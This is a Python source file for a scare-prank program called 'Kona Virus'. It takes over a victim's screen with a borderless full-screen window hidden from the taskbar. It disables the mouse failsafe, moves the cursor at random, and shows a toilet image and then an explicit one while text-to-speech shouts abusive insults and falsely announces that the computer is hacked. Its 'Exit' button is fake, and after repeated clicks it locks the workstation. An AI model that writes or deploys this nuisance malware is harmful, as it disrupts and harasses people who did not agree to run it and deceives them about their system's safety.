""" Kona Virus - use it at your own risk """

""" 
 Author: Ashraf Minhaj
 email: ashraf_minhaj@yahoo.com
 site: ashrafminhajfb.blogspot.com
"""


import tkinter            #tkinter gui library
from tkinter import *     #import everything that's needed from tkinter
import pyttsx3            #text to speech (TTS)
import os                 # to use pipe (to shut down or lock the computer)
import pyautogui          #for mouse and keyboard action
from random import randint  #to generate random number

#images that are to be used
toilet_image = "D:\\works\\viruses\\cona_virus\\toilet.gif"  #1st image (road rus toilet image)
hot_girl = "D:\\works\\viruses\\cona_virus\\hot.gif"         #2nd image (dirty hot image)



class App:
    """Main class that contains everything. Contains all the functionality of this app."""

    def __init__(self, window):
        """Initialize things. This runs when we run the app"""

        self.window = window          #create tkinter window
        self.engine = pyttsx3.init()  #initialize pyttsx3 TTS engine

        pyautogui.FAILSAFE = FALSE  #cursor corner movement doesn's shut it

        #create a label that will contain the image
        self.imagel = Label(self.window)
        self.imagel.pack(fill=BOTH, expand=YES)     #this makes the image in center

        #load image for tkinter
        self.toilet = PhotoImage(file=toilet_image)
        self.hot = PhotoImage(file=hot_girl)

        #This removes app bar and buttons to close also hides from taskbar
        self.window.overrideredirect(True)
        #Make the software fullscreen - as per the screen size
        self.window.geometry("{0}x{1}+0+0".format(self.window.winfo_screenwidth(), self.window.winfo_screenheight()))

        #buttons
        self.fake_exit_but = Button(self.window, text="Exit", command=self.update)
        self.fake_exit_but.config(fg='red', border=0, borderwidth=1, bg='black')
        self.fake_exit_but.place(x=5, y=5)

        self.flag = 1 #1 - Show toilet image, else -hot image
        self.count = 0 #count variable

        self.x, self.y = pyautogui.size() #get the screen size

        self.ui()   #run the user interface


        self.window.mainloop()  #runs tk app till the Eternity

    def ui(self):
        """Everything happens here"""

        print(self.flag) #just for debugging - to know what's the value

        if self.count >= 5:
            os.popen("rundll32.exe user32.dll,LockWorkStation")  #lock the computer

        if self.flag == 1:   #Initially show the toilet picture and say hacked
            self.imagel.configure(image=self.toilet)
            self.talk("Your computer is hacked mother fucker!!")

        else:   #if button 'Exit' is clicked change image and ...
            self.imagel.configure(image=self.hot)
            self.talk("You are a shameless dirty ugly bustard")

            self.count += 1 #increment count variable each time this condition is true

        #get a value between 0 to max pixels
        rand_x = randint(0, self.x)
        rand_y = randint(0, self.y)
        #now move the mouse - this will freak the victim
        pyautogui.moveTo(rand_x, rand_y) 
            

        self.imagel.after(15, self.ui)  #to repeat talk and change image


    def update(self):
        """Flag value update"""
        if self.flag == 1:
            self.flag = 2

        print("clicked")

    def talk(self, words):
        """Talk the words that are passed to it - 125 words per minute"""
        self.engine.say(words)
        self.engine.setProperty('rate', 130)
        self.engine.runAndWait()



App(Tk())  #run the app
